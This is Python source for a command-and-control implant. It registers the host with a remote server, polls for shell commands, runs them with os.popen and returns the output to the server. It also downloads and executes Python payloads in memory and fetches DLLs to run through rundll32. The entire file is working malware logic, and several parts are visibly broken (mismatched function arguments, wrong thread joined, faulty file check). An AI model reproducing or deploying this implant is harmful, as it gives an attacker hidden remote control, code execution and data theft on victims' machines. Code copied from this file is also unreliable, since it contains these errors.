import requests
import glob
import time
import os
from multiprocessing import Process
import base64
import threading
from Crypto.Cipher import AES
import socket

host_name = socket.gethostname()

global th_list
th_list = []

def exec_py():
    global payload
    exec(payload)

def ondisk_py():
    global payload
    with open("_.py",'w') as file:
        file.write(payload)
    from _ import main
    return ""

def execute_py_implant(url,session):
    response = session.get(url,headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
    if response.status_code == 200:
        global payload
        payload = response.text
        if payload.split("\n")[0]=="#ondisk":
            target = ondisk_py
        else:
            target = exec_py
        try:
            global th_list
            th = threading.Thread(target=target)
            th_list.append(th)
            th.start()
        except:
            pass

def rundll(url):
    response = session.get(url,headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
    if response.status_code == 200:
        payload = response.text
        try:
            content = requests.get(url)
            with open("o.dll","wb") as file:
                file.write(content)
            global th_list
            x = lambda:os.popen(f'rundll32 ./o.dll,entrypoint')
            th = threading.Thread(target=x)
            th_list.append(th)
            th.start()
            os.remove("o.dll")
        except:
            pass

MODE = "dev"

if MODE=="dev":
    try:
        with open('host_describe.abcd',"r") as file:
            a = file.read()
        host = a.split("\n")[0]
    except:
        host="127.0.0.1"
else:
    host = "127.0.0.1"
session = requests.Session()

if "id" not in glob.glob("*.*"):
    while True:
        try:
            response = session.get(f"http://{host}/get_id?name={host_name}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            break
        except:
            time.sleep(30)
    with open("id","w") as file:
        file.write(response.text)

with open("id","r") as file:
    id = int(file.read())


while True:
    try:
        while True:
            try:
                response1 = session.get(f"http://{host}/blank/",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
                response2 = response1
                break
            except:
                time.sleep(5)
        skip = False
        while response1.text == "" and response2.text == "":
            time.sleep(5)
            response1 = session.get(f"http://{host}/queue/?id={id}&action=fetch",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            response2 = session.get(f"http://{host}/get_command/?id={id}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
        if response2.text == "" and response1.text != "":
            response3 = session.get(f"http://{host}/queue/?id={id}&action=pop",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            out = "".join(list(os.popen(str(response3.text))))
            command = response3.text
        elif response2.text != "":
            if "MemRunPy:" in str(response2.text):
                payload_uri = ':'.join(str(response2.text).split(":")[1:])
                execute_py_implant(payload_uri,session)
                skip = True
            elif "MemRunDllCode:" in str(response2.text):
                payload_uri = str(response2.text).split(":")[1]
                rundll(payload_uri,session)
                skip = True
            else:
                out = "".join(list(os.popen(str(response2.text))))
                command = response2.text
        if not skip:
            response_f = session.get(f"http://{host}/666",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            while response_f.status_code != 200:
                response_f = session.get(f"http://{host}/push_command/?id={id}&data={out}&command={command}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
                time.sleep(5)
            time.sleep(10)
    except:
        time.sleep(20)

if len(th_list)!=0:
    for i in th_list:
        th.join()
